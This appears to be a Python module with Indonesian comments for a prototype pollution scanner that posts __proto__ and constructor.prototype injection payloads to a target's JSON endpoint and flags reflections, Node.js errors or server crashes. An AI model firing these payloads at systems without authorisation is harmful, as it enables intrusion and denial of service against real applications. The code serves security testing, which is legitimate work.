import requests
import json
import copy
from colorama import Fore, Style

class PrototypeHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-ProtoHunter/42.0',
            'Content-Type': 'application/json'
        }
        
        # Payload untuk mencemari prototype
        # Kita gunakan properti aman 'zeroburst_scan' untuk testing
        self.test_property = "zeroburst_scan"
        self.test_value = "true"

    def generate_payloads(self, base_data={}):
        """
        Menghasilkan variasi payload JSON untuk Prototype Pollution.
        """
        payloads = []
        
        # Teknik 1: __proto__
        # Format: {"__proto__": {"polluted": true}}
        p1 = copy.deepcopy(base_data)
        p1["__proto__"] = {self.test_property: self.test_value}
        payloads.append({'type': '__proto__ Injection', 'json': p1})

        # Teknik 2: constructor.prototype
        # Format: {"constructor": {"prototype": {"polluted": true}}}
        p2 = copy.deepcopy(base_data)
        p2["constructor"] = {"prototype": {self.test_property: self.test_value}}
        payloads.append({'type': 'constructor.prototype Injection', 'json': p2})

        # Teknik 3: Obfuscated __proto__ (Bypass WAF)
        # Kadang WAF blokir string "__proto__", tapi tidak blokir di dalam path
        # Ini sulit direpresentasikan dalam dict Python standar untuk dikirim sebagai JSON raw,
        # jadi kita kirim sebagai string manual nanti jika perlu.
        
        return payloads

    def check_reflection(self, response):
        """
        Mengecek indikasi kerentanan.
        Karena ini Black-Box scanning, kita sulit mengecek apakah prototype benar-benar tercemar
        tanpa akses ke console server. 
        
        Indikator Vulnerable:
        1. Respon mengandung properti yang kita inject (Reflected).
        2. Status 500 (Internal Server Error) -> Mungkin merusak logic (DoS Potential).
        3. Waktu respon melambat signifikan (Processing recursion).
        """
        
        # Cek apakah nilai injeksi muncul di respon
        if f'"{self.test_property}"' in response.text and f'"{self.test_value}"' in response.text:
            return True, "Reflected in Response"
            
        # Cek Error Spesifik Node.js
        errors = ["ReferenceError", "TypeError", "Object.prototype", "JSON.parse"]
        for err in errors:
            if err in response.text:
                return True, f"Server Error Triggered ({err})"
                
        return False, None

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Prototype Pollution Hunter (Node.js/JS){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        # Kita butuh endpoint yang menerima JSON (biasanya metode POST/PUT)
        # Untuk demo, kita asumsikan target menerima POST
        
        # Dummy data dasar (jika target butuh struktur tertentu, user harus menyesuaikan)
        base_data = {"foo": "bar", "user": "test"}
        
        payload_list = self.generate_payloads(base_data)
        print(f"{Fore.YELLOW}[+] Testing {len(payload_list)} injection vectors on JSON body...{Style.RESET_ALL}")

        vuln_found = False

        for p in payload_list:
            try:
                # Kirim Request
                res = self.session.post(self.target, json=p['json'], timeout=10)
                
                is_suspicious, reason = self.check_reflection(res)
                
                # Analisis Status Code
                status_color = Fore.GREEN if res.status_code == 200 else Fore.YELLOW
                if res.status_code == 500: status_color = Fore.RED
                
                print(f"   {Fore.WHITE}Trying {p['type']:<30} -> Status: {status_color}{res.status_code}{Style.RESET_ALL}")

                if is_suspicious:
                    print(f"   {Fore.RED}[POTENTIAL VULN] Pattern matched!{Style.RESET_ALL}")
                    print(f"   ├── Payload Sent: {json.dumps(p['json'])}")
                    print(f"   └── Reason      : {reason}")
                    print(f"   └── Check       : Verify if '{self.test_property}' exists in other responses.")
                    vuln_found = True
                
                # Khusus Status 500 seringkali berarti polusi berhasil merusak objek
                if res.status_code == 500 and not is_suspicious:
                     print(f"   {Fore.MAGENTA}[WARNING] Server 500 Error. Injection might have crashed the logic (DoS).{Style.RESET_ALL}")

            except Exception as e:
                print(f"   [!] Error: {e}")

        print("-" * 60)
        if vuln_found:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: Prototype Pollution vectors detected.{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Impact: RCE, Auth Bypass on Node.js environments.")
        else:
            print(f"{Fore.GREEN}[OK] Target handled JSON objects safely.{Style.RESET_ALL}")

def run_prototype_scan(url):
    engine = PrototypeHunter(url)
    engine.run_scan()